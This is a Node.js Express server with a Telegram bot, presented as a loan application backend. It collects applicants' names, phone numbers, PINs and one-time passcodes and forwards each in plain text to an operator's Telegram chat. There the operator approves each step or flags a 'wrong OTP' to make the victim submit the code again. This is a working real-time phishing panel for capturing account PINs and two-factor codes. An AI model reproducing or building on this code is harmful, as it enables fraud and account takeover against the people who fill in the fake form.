const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());

// Replace with your actual Telegram Bot Token & Admin Chat ID
const TELEGRAM_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
const ADMIN_CHAT_ID = 'YOUR_ADMIN_CHAT_ID';

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// In-memory database for application states
const applications = {};

// 1. Submit Basic Details
app.post('/api/step1', (req, res) => {
  const id = Date.now().toString();
  applications[id] = { ...req.body, status: 'pending_step1' };

  const message = `📥 *NEW LOAN APPLICATION*\n` +
                  `*ID:* ${id}\n` +
                  `*Name:* ${req.body.fullName}\n` +
                  `*Phone:* ${req.body.countryCode}${req.body.phone}\n` +
                  `*Purpose:* ${req.body.purpose}`;

  bot.sendMessage(ADMIN_CHAT_ID, message, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: "✅ Approve Step 1", callback_data: `approve_step1_${id}` }]
      ]
    }
  });

  res.json({ id });
});

// 2. Submit PIN
app.post('/api/step2', (req, res) => {
  const { id, pin } = req.body;
  applications[id].pin = pin;
  applications[id].status = 'pending_step2';

  const message = `🔑 *PIN SUBMITTED*\n*ID:* ${id}\n*PIN:* \`${pin}\``;

  bot.sendMessage(ADMIN_CHAT_ID, message, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: "✅ Approve PIN", callback_data: `approve_step2_${id}` }]
      ]
    }
  });

  res.json({ success: true });
});

// 3. Submit OTP
app.post('/api/step3', (req, res) => {
  const { id, otp } = req.body;
  applications[id].otp = otp;
  applications[id].status = 'pending_otp';

  const message = `📲 *OTP SUBMITTED*\n*ID:* ${id}\n*OTP Code:* \`${otp}\``;

  bot.sendMessage(ADMIN_CHAT_ID, message, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Approve OTP", callback_data: `approve_otp_${id}` },
          { text: "❌ Wrong OTP", callback_data: `wrong_otp_${id}` }
        ]
      ]
    }
  });

  res.json({ success: true });
});

// Check Status API Endpoint
app.get('/api/status', (req, res) => {
  const id = req.query.id;
  const appData = applications[id];
  res.json({ status: appData ? appData.status : 'not_found' });
});

// Handle Telegram Admin Button Clicks
bot.on('callback_query', (query) => {
  const data = query.data;

  if (data.startsWith('approve_step1_')) {
    const id = data.replace('approve_step1_', '');
    applications[id].status = 'step1_approved';
    bot.answerCallbackQuery(query.id, { text: "Step 1 Approved!" });
    bot.editMessageText(`✅ Step 1 Approved for Application #${id}`, {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id
    });
  } 
  else if (data.startsWith('approve_step2_')) {
    const id = data.replace('approve_step2_', '');
    applications[id].status = 'step2_approved';
    bot.answerCallbackQuery(query.id, { text: "PIN Approved!" });
    bot.editMessageText(`✅ PIN Approved for Application #${id}`, {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id
    });
  } 
  else if (data.startsWith('approve_otp_')) {
    const id = data.replace('approve_otp_', '');
    applications[id].status = 'approved';
    bot.answerCallbackQuery(query.id, { text: "Loan Finalized & Approved!" });
    bot.editMessageText(`🎉 Loan APPROVED for Application #${id}`, {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id
    });
  } 
  else if (data.startsWith('wrong_otp_')) {
    const id = data.replace('wrong_otp_', '');
    applications[id].status = 'otp_wrong';
    bot.answerCallbackQuery(query.id, { text: "Marked as Wrong OTP" });
    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Marked OTP as wrong for Application #${id}. User prompted to re-enter.`);
  }
});

app.listen(3000, () => console.log('Server running on port 3000'));
         
